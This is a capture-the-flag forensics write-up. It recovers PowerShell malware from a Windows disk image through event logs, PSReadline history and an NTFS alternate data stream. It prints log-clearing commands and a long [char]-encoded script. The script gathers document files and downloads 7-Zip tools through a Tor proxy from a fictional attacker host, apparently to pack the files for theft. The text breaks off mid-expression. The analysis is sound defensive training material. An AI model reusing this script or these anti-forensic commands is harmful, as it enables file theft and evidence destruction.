---
layout: post
title:  "Cyber Apocalypse 2023: Artifacts of Dangerous Sightings"
date:   2023-04-08 00:00:00
tags: [vhdx, Disk-Image, PowerShell, Windows-Event-Viewer, Autospy]
description: 'Analyse a Disk-Image from a compromised system and find the malware.'
categories: [WriteUp, Forensic, HTB-Cyber-Apocalypse-2023]
---

## Challenge Information
![Challenge Information](/assets/img/artifacts-info.png){: .shadow }

## Mount the given disk image
The challenge comes with a folder containing a file with the extension `.vhdx`.
This extension is used for virtual hard disks. Like a physical hard disk, it
can be mounted to a running Windows system. Remember to set the disk to
read-only mode, because otherwise the evidence could be damaged. In official
investigations you would use a hardware write blocker for that. I used the
following PowerShell command for that:
```powershell
Mount-DiskImage `
	-Access ReadOnly `
	-ImagePath C:\Users\ctf\2023-03-09T132449_PANDORA.vhdx
```


## Analyze disk using Autopsy
From previous investigations i knew you could use Autopsy to scan the image for
evidence. Autopsy only support `.vhd` files because of that we need to convert
the `.vhdx` file. The following command is only executeable as administrator and
when HyperV is enabled. Unlucky Autopsy didn’t found any traces that were help.
```powershell
Convert-VHD `
	-Path .\2023-03-09T132449_PANDORA.vhdx `
	-DestinationPath .\2023-03-09T132449_PANDORA.vhd
```


## Analyze Windows Event Viewer Logs
The description mentioned that the security logs were fluted. So I took a look
at the security logs stored under
`D:\C\Windows\System32\winevt\logs\Security.evtx`. Using the Windows Event
Viewer, we can filter for all events that belong to the user Pandora.
```xml
<QueryList>
  <Query Id="0" Path="file://D:\C\Windows\System32\winevt\logs\Security.evtx">
    <Select Path="file://D:\C\Windows\System32\winevt\logs\Security.evtx">
      * [EventData[Data[@Name="SubjectUserName"]='**Pandora**']]
    </Select>
  </Query>
</QueryList>
```
This filter reduces the number of available logs from 664 to 119. A number I
could search through manually. I found that the user Pandora opened PowerShell
and executed two strange-looking events:
- `wevtutil.exe cl “Windows PowerShell”`
- `wevtutil.exe cl “Microsoft-Windows-PowerShell/Operational”`

These commands clear all stored events and logs for PowerShell. So my focus
shifted to PowerShell and its executed commands. 
![Event Viewer Log](/assets/img/artifacts-log-powershell.png)
![Event Viewer Log](/assets/img/artifacts-log-info.png)


## Analyze PowerShell History
When you know the Linux Bash history, the PowerShell history seems confusing at
first. When you enter the command `history` the PowerShell shows the session
history. Which contains all commands that have been executed in the same
PowerShell window. If you want to see a list of all commands, take a look at
the PSReadline history, which is located under
`%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
This
[article](https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.3)
from Microsoft gives more information about the PSReadline Module.
In the challenge the file was located under:
`D:\C\Users\Pandora\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`.
```powershell
type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
exit
Get-WinEvent
Get-EventLog -List
wevtutil.exe cl "Windows PowerShell" 
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
Remove-EventLog -LogName "Windows PowerShell"
Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
Remove-EventLog
```
{: file="ConsoleHost_history.txt" }

## Find extract hidden file
The history shows us that a file named `ActiveSyncProvider.dll:hidden.ps1` has
been created on the system. The `:` inside the filename indicates an alternative
data stream. A feature that is implemented in the NFTS file system and can not
be spotted by the file explorer. You can read the file using Notepad or the
`expand` command inside PowerShell.
```powershell
expand ActiveSyncProvider.dll:hidden.ps1 hidden.ps1
```
![Hidden ps1 code](/assets/img/artifacts-hidden.png)

## Analyze the PowerShell script
When working with PowerShell, complex commands can be formatted as base64 and
given to the PowerShell using the `-enc` flag. It is important to know that
PowerShell uses UTF16-LE encoding instead of UTF8. Using the free tool
Cyberchef we can decode the given command.
![Hidden ps1 code](/assets/img/artifacts-cyber-chef.png)

## Deobfuscate PowerShell script by human
The PowerShell code looked very confusing to me. So I extracted the first lines to check what they do.
```powershell
# start powershell session needed because othwer wise variables stack and 1,2,3, ...
# 0
${[~@} = $();
echo ${[~@}

# 1
${!!@!!]} = ++${[~@};
echo ${!!@!!]}

# 2
${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]};
echo ${[[!}

# 3
${~~~]} = ${[[!} + ${!!@!!]};
echo ${~~~]}

# 4
${[!![!} = ${[[!} + ${[[!};
echo ${[!![!}

# 5
${(~(!} = ${~~~]} + ${[[!};
echo ${(~(!}

# 6
${!~!))} = ${[!![!} + ${[[!};
echo ${!~!))}

# 7
${((!} = ${!!@!!]} + ${[!![!} + ${[[!};
echo ${((!}

# 8
${=!!@!!} = ${~~~]} - ${!!@!!]} + ${!~!))};
echo ${=!!@!!}

# 9
${!=} =  ${((!} - ${~~~]} + ${!~!))} - ${!!@!!]};
echo ${!=}

# string Insert(int startIndex, string value)
${=@!~!} = "".("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3]);
echo ${=@!~!}

# iex
${=@!~!} = "$(@{})"[14]+"$?"[3]+"${=@!~!}"[27];
echo ${=@!~!}

# char
${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]";
echo ${@!=}
```
That made me think and I started to replace the variables with their values.
Therefore I used the replace feature inside Visual Studio Code. Then I removed
the `iex` so the code wouldn’t harm my system. As a result the code looked like
the following:
```powershell
$out = [char]35 + [char]35 + [char]35 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]43 + [char]32 + [char]32 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]46 + [char]32 + [char]46 + [char]95 + [char]95 + [char]95 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]45 + [char]95 + [char]95 + [char]95 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]32 + [char]95 + [char]34 + [char]46 + [char]94 + [char]32 + [char]46 + [char]94 + [char]32 + [char]94 + [char]46 + [char]32 + [char]32 + [char]39 + [char]46 + [char]46 + [char]32 + [char]58 + [char]34 + [char]45 + [char]95 + [char]46 + [char]32 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]58 + [char]46 + [char]46 + [char]47 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]94 + [char]32 + [char]32 + [char]58 + [char]46 + [char]58 + [char]92 + [char]46 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]32 + [char]43 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]47 + [char]58 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]95 + [char]32 + [char]58 + [char]58 + [char]58 + [char]47 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]45 + [char]32 + [char]58 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]47 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]92 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]32 + [char]58 + [char]32 + [char]46 + [char]58 + [char]46 + [char]124 + [char]46 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]58 + [char]58 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]58 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]45 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]58 + [char]32 + [char]32 + [char]58 + [char]58 + [char]124 + [char]46 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]58 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]92 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]43 + [char]32 + [char]58 + [char]58 + [char]32 + [char]58 + [char]32 + [char]45 + [char]46 + [char]58 + [char]92 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]43 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]92 + [char]46 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]35 + [char]46 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]58 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]46 + [char]58 + [char]46 + [char]46 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]46 + [char]32 + [char]58 + [char]32 + [char]32 + [char]45 + [char]58 + [char]58 + [char]58 + [char]58 + [char]46 + [char]92 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]124 + [char]32 + [char]124 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]45 + [char]58 + [char]46 + [char]34 + [char]58 + [char]46 + [char]58 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]45 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]32 + [char]46 + [char]58 + [char]32 + [char]46 + [char]58 + [char]58 + [char]58 + [char]46 + [char]58 + [char]46 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]58 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]46 + [char]46 + [char]46 + [char]58 + [char]58 + [char]95 + [char]58 + [char]46 + [char]46 + [char]58 + [char]92 + [char]32 + [char]32 + [char]32 + [char]95 + [char]95 + [char]95 + [char]32 + [char]32 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]58 + [char]46 + [char]32 + [char]46 + [char]46 + [char]32 + [char]46 + [char]32 + [char]32 + [char]46 + [char]58 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]58 + [char]92 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]58 + [char]47 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]32 + [char]43 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]46 + [char]32 + [char]32 + [char]32 + [char]58 + [char]32 + [char]46 + [char]32 + [char]58 + [char]58 + [char]46 + [char]32 + [char]58 + [char]46 + [char]58 + [char]46 + [char]32 + [char]46 + [char]58 + [char]46 + [char]124 + [char]92 + [char]32 + [char]32 + [char]46 + [char]58 + [char]47 + [char]124 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]83 + [char]67 + [char]82 + [char]73 + [char]80 + [char]84 + [char]32 + [char]84 + [char]79 + [char]32 + [char]68 + [char]69 + [char]76 + [char]65 + [char]89 + [char]32 + [char]72 + [char]85 + [char]77 + [char]65 + [char]78 + [char]32 + [char]82 + [char]69 + [char]83 + [char]69 + [char]65 + [char]82 + [char]67 + [char]72 + [char]32 + [char]79 + [char]78 + [char]32 + [char]82 + [char]69 + [char]76 + [char]73 + [char]67 + [char]32 + [char]82 + [char]69 + [char]67 + [char]76 + [char]65 + [char]77 + [char]65 + [char]84 + [char]73 + [char]79 + [char]78 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]83 + [char]84 + [char]65 + [char]89 + [char]32 + [char]81 + [char]85 + [char]73 + [char]69 + [char]84 + [char]32 + [char]45 + [char]32 + [char]72 + [char]65 + [char]67 + [char]75 + [char]32 + [char]84 + [char]72 + [char]69 + [char]32 + [char]72 + [char]85 + [char]77 + [char]65 + [char]78 + [char]83 + [char]32 + [char]45 + [char]32 + [char]83 + [char]84 + [char]69 + [char]65 + [char]76 + [char]32 + [char]84 + [char]72 + [char]69 + [char]73 + [char]82 + [char]32 + [char]83 + [char]69 + [char]67 + [char]82 + [char]69 + [char]84 + [char]83 + [char]32 + [char]45 + [char]32 + [char]70 + [char]73 + [char]78 + [char]68 + [char]32 + [char]84 + [char]72 + [char]69 + [char]32 + [char]82 + [char]69 + [char]76 + [char]73 + [char]67 + [char]10 + [char]35 + [char]35 + [char]35 + [char]32 + [char]71 + [char]79 + [char]32 + [char]65 + [char]76 + [char]76 + [char]73 + [char]69 + [char]78 + [char]83 + [char]32 + [char]65 + [char]76 + [char]76 + [char]73 + [char]65 + [char]78 + [char]67 + [char]69 + [char]32 + [char]33 + [char]33 + [char]33 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]80 + [char]97 + [char]115 + [char]115 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]61 + [char]64 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]54 + [char]53 + [char]46 + [char]46 + [char]57 + [char]48 + [char]124 + [char]102 + [char]111 + [char]114 + [char]101 + [char]97 + [char]99 + [char]104 + [char]45 + [char]111 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]123 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]43 + [char]61 + [char]91 + [char]99 + [char]104 + [char]97 + [char]114 + [char]93 + [char]36 + [char]95 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]110 + [char]117 + [char]109 + [char]61 + [char]64 + [char]40 + [char]41 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]52 + [char]56 + [char]46 + [char]46 + [char]53 + [char]55 + [char]124 + [char]102 + [char]111 + [char]114 + [char]101 + [char]97 + [char]99 + [char]104 + [char]45 + [char]111 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]123 + [char]36 + [char]110 + [char]117 + [char]109 + [char]43 + [char]61 + [char]91 + [char]99 + [char]104 + [char]97 + [char]114 + [char]93 + [char]36 + [char]95 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]36 + [char]110 + [char]117 + [char]109 + [char]32 + [char]43 + [char]32 + [char]36 + [char]97 + [char]108 + [char]112 + [char]104 + [char]32 + [char]124 + [char]32 + [char]83 + [char]111 + [char]114 + [char]116 + [char]45 + [char]79 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116 + [char]32 + [char]123 + [char]71 + [char]101 + [char]116 + [char]45 + [char]82 + [char]97 + [char]110 + [char]100 + [char]111 + [char]109 + [char]125 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]32 + [char]45 + [char]106 + [char]111 + [char]105 + [char]110 + [char]32 + [char]39 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]114 + [char]101 + [char]116 + [char]117 + [char]114 + [char]110 + [char]32 + [char]36 + [char]114 + [char]101 + [char]115 + [char]59 + [char]32 + [char]10 + [char]125 + [char]10 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]109 + [char]97 + [char]107 + [char]101 + [char]70 + [char]105 + [char]108 + [char]101 + [char]76 + [char]105 + [char]115 + [char]116 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]115 + [char]32 + [char]61 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]119 + [char]104 + [char]101 + [char]114 + [char]101 + [char]32 + [char]47 + [char]114 + [char]32 + [char]36 + [char]101 + [char]110 + [char]118 + [char]58 + [char]85 + [char]83 + [char]69 + [char]82 + [char]80 + [char]82 + [char]79 + [char]70 + [char]73 + [char]76 + [char]69 + [char]32 + [char]42 + [char]46 + [char]112 + [char]100 + [char]102 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]120 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]32 + [char]42 + [char]46 + [char]120 + [char]108 + [char]115 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]120 + [char]32 + [char]42 + [char]46 + [char]112 + [char]112 + [char]116 + [char]32 + [char]42 + [char]46 + [char]116 + [char]120 + [char]116 + [char]32 + [char]42 + [char]46 + [char]99 + [char]115 + [char]118 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]32 + [char]42 + [char]46 + [char]104 + [char]116 + [char]109 + [char]108 + [char]32 + [char]42 + [char]46 + [char]112 + [char]104 + [char]112 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]76 + [char]105 + [char]115 + [char]116 + [char]32 + [char]61 + [char]32 + [char]36 + [char]102 + [char]105 + [char]108 + [char]101 + [char]115 + [char]32 + [char]45 + [char]115 + [char]112 + [char]108 + [char]105 + [char]116 + [char]32 + [char]39 + [char]92 + [char]114 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]114 + [char]101 + [char]116 + [char]117 + [char]114 + [char]110 + [char]32 + [char]36 + [char]76 + [char]105 + [char]115 + [char]116 + [char]59 + [char]10 + [char]125 + [char]10 + [char]10 + [char]102 + [char]117 + [char]110 + [char]99 + [char]116 + [char]105 + [char]111 + [char]110 + [char]32 + [char]99 + [char]111 + [char]109 + [char]112 + [char]114 + [char]101 + [char]115 + [char]115 + [char]40 + [char]36 + [char]80 + [char]97 + [char]115 + [char]115 + [char]41 + [char]10 + [char]123 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]116 + [char]109 + [char]112 + [char]32 + [char]61 + [char]32 + [char]36 + [char]101 + [char]110 + [char]118 + [char]58 + [char]84 + [char]69 + [char]77 + [char]80 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]104 + [char]116 + [char]116 + [char]112 + [char]115 + [char]58 + [char]47 + [char]47 + [char]114 + [char]101 + [char]108 + [char]105 + [char]99 + [char]45 + [char]114 + [char]101 + [char]99 + [char]108 + [char]97 + [char]109 + [char]97 + [char]116 + [char]105 + [char]111 + [char]110 + [char]45 + [char]97 + [char]110 + [char]111 + [char]110 + [char]121 + [char]109 + [char]111 + [char]117 + [char]115 + [char]46 + [char]97 + [char]108 + [char]105 + [char]101 + [char]110 + [char]58 + [char]49 + [char]51 + [char]51 + [char]55 + [char]47 + [char]112 + [char]114 + [char]111 + [char]103 + [char]47 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]61 + [char]32 + [char]36 + [char]115 + [char]32 + [char]43 + [char]32 + [char]39 + [char]55 + [char]122 + [char]46 + [char]100 + [char]108 + [char]108 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]61 + [char]32 + [char]36 + [char]115 + [char]32 + [char]43 + [char]32 + [char]39 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]61 + [char]32 + [char]39 + [char]34 + [char]39 + [char]43 + [char]36 + [char]116 + [char]109 + [char]112 + [char]43 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]100 + [char]108 + [char]108 + [char]34 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]61 + [char]32 + [char]39 + [char]34 + [char]39 + [char]43 + [char]36 + [char]116 + [char]109 + [char]112 + [char]43 + [char]39 + [char]92 + [char]55 + [char]122 + [char]46 + [char]101 + [char]120 + [char]101 + [char]34 + [char]39 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]99 + [char]117 + [char]114 + [char]108 + [char]32 + [char]45 + [char]115 + [char]32 + [char]45 + [char]120 + [char]32 + [char]115 + [char]111 + [char]99 + [char]107 + [char]115 + [char]53 + [char]104 + [char]58 + [char]47 + [char]47 + [char]108 + [char]111 + [char]99 + [char]97 + [char]108 + [char]104 + [char]111 + [char]115 + [char]116 + [char]58 + [char]57 + [char]48 + [char]53 + [char]48 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]32 + [char]45 + [char]111 + [char]32 + [char]36 + [char]55 + [char]122 + [char]100 + [char]108 + [char]108 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]99 + [char]109 + [char]100 + [char]32 + [char]47 + [char]99 + [char]32 + [char]99 + [char]117 + [char]114 + [char]108 + [char]32 + [char]45 + [char]115 + [char]32 + [char]45 + [char]120 + [char]32 + [char]115 + [char]111 + [char]99 + [char]107 + [char]115 + [char]53 + [char]104 + [char]58 + [char]47 + [char]47 + [char]108 + [char]111 + [char]99 + [char]97 + [char]108 + [char]104 + [char]111 + [char]115 + [char]116 + [char]58 + [char]57 + [char]48 + [char]53 + [char]48 + [char]32 + [char]36 + [char]108 + [char]105 + [char]110 + [char]107 + [char]95 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]32 + [char]45 + [char]111 + [char]32 + [char]36 + [char]55 + [char]122 + [char]101 + [char]120 + [char]101 + [char]59 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]10 + [char]32 + [char]32 + [char]32 + [char]32 + [char]36 + [char]97 + [char]114 + [char]103 + [char]69 + [char]120 + [char]116 + [char]101 + [char]110 + [char]115 + [char]105 + [char]111 + [char]110 + [char]115 + [char]32 + [char]61 + [char]32 + [char]39 + [char]42 + [char]46 + [char]112 + [char]100 + [char]102 + [char]32 + [char]42 + [char]46 + [char]100 + [char]111 + [char]99 + [char]32 + [char]42 + [char]46 + [char]100 + 